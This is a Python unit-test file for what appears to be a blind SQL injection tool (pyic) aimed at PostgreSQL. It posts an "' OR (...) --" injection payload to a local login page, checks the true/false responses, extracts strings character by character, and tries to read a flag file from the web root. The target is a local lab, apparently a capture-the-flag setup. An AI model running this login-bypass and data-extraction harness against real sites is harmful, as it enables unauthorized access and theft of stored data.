from unittest import TestCase

import requests

from pyic import BlindTester, BlindStringFinder, PGSQLPayloads


class TestPGSQLBlindStringFinder(TestCase):

    def setUp(self):
        self.tester = BlindTester(
            lambda payload: requests.post('http://127.0.0.1:8182/login.php',
                                          data={'login': 'admin', 'pass': "' OR ({}) --".format(payload)}),
            lambda r: 'Logged' in r.text)

        self.string_finder = BlindStringFinder(self.tester, PGSQLPayloads())

    def test_false_serie(self):
        for i in range(0, 10):
            self.assertFalse(self.tester.test('1=0'))

    def test_true_serie(self):
        for i in range(0, 10):
            self.assertTrue(self.tester.test('1=1'))

    def test_str_length(self):
        self.assertEqual(self.string_finder.str_length("(SELECT {})".format('$$coucou$$')),
                         6)

    def test_read_string(self):
        self.assertEqual(self.string_finder.read_string("(SELECT {})".format('$$coucou$$')),
                         'coucou')

    def read_file(self):
        self.string_finder.read_file('/var/www/html/flag.txt')

    def test_read_file(self):
        self.assertRaises(Exception, self.read_file)
